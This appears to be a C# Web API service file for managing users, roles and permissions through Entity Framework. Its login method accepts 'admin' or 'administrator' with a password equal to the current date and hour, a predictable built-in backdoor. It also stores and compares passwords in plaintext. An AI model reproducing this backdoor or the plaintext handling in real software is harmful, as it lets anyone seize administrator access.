﻿using HNKWebAPI.DataSource;
using HNKWebAPI.Dtos;
using HNKWebAPI.Entities;
using HNKWebAPI.IService;
using HNKWebAPI.Models;
using HNKWebAPI.Utils;
using Microsoft.EntityFrameworkCore;
using System;
using System.Collections.Generic;
using System.Linq;

namespace HNKWebAPI.Services {
    public class RbacService : IRbacService {
        public RbacService(DataSourceContext dataSourceContext) {
            db_ = dataSourceContext;
        }
        public ResponseModel AddUser(UsersDto user) {
            Users user_ = ClassMapping.ClassMemberMapping<UsersDto, Users>(user);
            ResponseModel response = new ResponseModel();
            if (user_.UserAccount.ToLower().Equals("admin") ||
              user_.UserAccount.ToLower().Equals("administrator")) {
                response.Code = 0;
                response.Message = "User Account is Invalid";
            }
            else {
                Users entity = db_.Users.AsNoTracking().Where(p => p.UserAccount.Equals(user_.UserAccount)).FirstOrDefault();
                if (entity != null) {
                    response.Code = 0;
                    response.Message = "User already Existed";
                }
                else {
                    db_.Users.Add(user_);
                    db_.SaveChanges();
                    response.Code = 1;
                    response.Data = user;
                    response.Message = "User create Success";
                }

            }
            return response;
        }

        public ResponseModel DeleteRole(int id) {
            ResponseModel response = new ResponseModel();
            var role = db_.Roles.Where(p => p.Id == id).FirstOrDefault();
            if (role != null) {
                db_.Roles.Remove(role);
                db_.SaveChanges();
            }
            return response;
        }

        public ResponseModel DeleteUser(int id) {
            ResponseModel response = new ResponseModel();
            Users user = db_.Users.Where(p => p.Id == id).FirstOrDefault();
            if (null != user) {
                db_.Users.Remove(user);
                db_.SaveChanges();
                return response;
            }
            else {
                response.Message = "specificed Objective dose NOT exist";
                response.Code = 0;
                return response;
            }
        }

        public ResponseModel GetPermissions() {
            return new ResponseModel { Data = db_.Permissions.ToList() };

            //List<Permissions> permissions = db_.Permissions.ToList();
            //ResponseModel response = new ResponseModel();
            //response.Data = permissions;
            //return response;
        }

        public ResponseModel GetRole(int id) {
            ResponseModel response = new ResponseModel();
            var role = db_.Roles.Where(p => p.Id == id).FirstOrDefault();
            if (role != null) {
                response.Data = role;
            }
            return response;
        }

        public ResponseModel GetRoleByUser(int userid) {
            ResponseModel response = new ResponseModel();
            var query = (from a in db_.UserRoleMaps
                         join b in db_.Roles on a.RoleId equals b.Id
                         where a.UserId == userid
                         select new Roles {
                             Id = b.Id,
                             RoleName = b.RoleName
                         }).ToList();
            response.Data = query;
            response.DataCount = query.Count();
            return response;
        }

        public ResponseModel GetRoles() {
            ResponseModel response = new ResponseModel();
            var roles = db_.Roles.ToList();
            response.Data = roles;
            response.DataCount = roles.Count();
            return response;
        }

        public ResponseModel GetUser(int id) {
            ResponseModel response = new ResponseModel();
            var user = db_.Users.Where(p => p.Id == id).FirstOrDefault();
            if (user != null) {
                response.Data = user;
            }
            return response;
        }

        public ResponseModel GetUsers() {
            ResponseModel response = new ResponseModel();
            var users = db_.Users.ToList();
            response.Data = users;
            response.DataCount = users.Count();
            return response;
        }
        
        public ResponseModel ModifyUser(UsersDto user) {
            var user_ = ClassMapping.ClassMemberMapping<UsersDto, Users>(user);
            var entity_ = db_.Users.AsNoTracking()
                .Where(p => p.Id == user_.Id).FirstOrDefault();
            ResponseModel response = new ResponseModel();
            if (null != entity_) {
                db_.Users.Update(entity_);
                db_.SaveChanges();
                response.Data = user;
            }
            else {
                response.Code = 0;
                response.Message = "user does NOT exist";
            }
            return response;
        }

        public ResponseModel SaveRole(Roles role) {
            ResponseModel response = new ResponseModel();
            if (role.RoleName.Equals("超级管理员")) {
                response.Code = 0;
                response.Message = "This role can only assigned by SYSTEM";
            }
            else {
                var entity = db_.Roles.AsNoTracking().Where(p => p.RoleName.Equals(role.RoleName)).FirstOrDefault();
                if (entity != null) {
                    role.Id = entity.Id;
                    db_.Roles.Update(role);
                }
                else {
                    db_.Roles.Add(role);
                }
                db_.SaveChanges();
                response.Data = role;
            }
            return response;
        }

        public ResponseModel SaveRoleMenu(RoleMenuMaps[] roleMenuMaps) {
            ResponseModel response = new ResponseModel();
            if (roleMenuMaps.Length > 0) {
                var maps = db_.RoleMenuMaps.Where(p => p.RoleId.Equals(roleMenuMaps[0].RoleId));
                db_.RoleMenuMaps.RemoveRange(maps);
                db_.RoleMenuMaps.AddRange(roleMenuMaps);
                db_.SaveChanges();
            }
            return response;
        }

        public ResponseModel SaveRolePermission(RolePermissionMaps[] rolePermissionMaps) {
            ResponseModel response = new ResponseModel();
            if (rolePermissionMaps.Length > 0) {
                var maps = db_.RolePermissionMaps.Where(p => p.RoleId.Equals(rolePermissionMaps[0].RoleId));
                db_.RolePermissionMaps.RemoveRange(maps);
                db_.RolePermissionMaps.AddRange(rolePermissionMaps);
                db_.SaveChanges();
            }
            return response;
        }

        public ResponseModel SaveUserRole(UserRoleMaps[] userRoleMaps) {
            ResponseModel response = new ResponseModel();
            if (userRoleMaps.Length > 0) {
                var maps = db_.UserRoleMaps.Where(p => p.UserId.Equals(userRoleMaps[0].UserId));
                db_.UserRoleMaps.RemoveRange(maps);
                db_.UserRoleMaps.AddRange(userRoleMaps);
                db_.SaveChanges();
            }
            return response;
        }

        public ResponseModel UserLogin(string userAccount, string password) {
            ResponseModel response = new ResponseModel();
            if (userAccount.ToLower().Equals("admin") || userAccount.ToLower().Equals("administrator")) {
                if (password.Equals(DateTime.Now.ToString("yyyyMMddHH"))) {
                    UsersDto userDto_ = new UsersDto() {
                        id = -1,
                        user_code = userAccount,
                        user_password = password,
                        user_name = "administrator",
                        user_id="0",
                        user_status=1,
                        create_time = DateTime.Now
                    };
                    response.Code = 1;
                    response.Data = userDto_;
                }
                else {
                    response.Code = 0;
                    response.Message = "username/password error!";
                }
            }
            else {
                Users user_ = db_.Users.Where(p => p.UserAccount.Equals(userAccount) && p.UserPassword.Equals(password)).FirstOrDefault();
                if (user_ == null) {
                    response.Message = "Login failed.username/password incorrect";
                    response.Code = 0;
                }
                else {
                    UsersDto usersDto = ClassMapping.ClassMemberMapping<Users, UsersDto>(user_);
                    response.Message = "Login success！";
                    response.Code = 1;
                    response.Data = usersDto;
                }
            }
            return response;
        }

        private readonly DataSourceContext db_;
    }
}
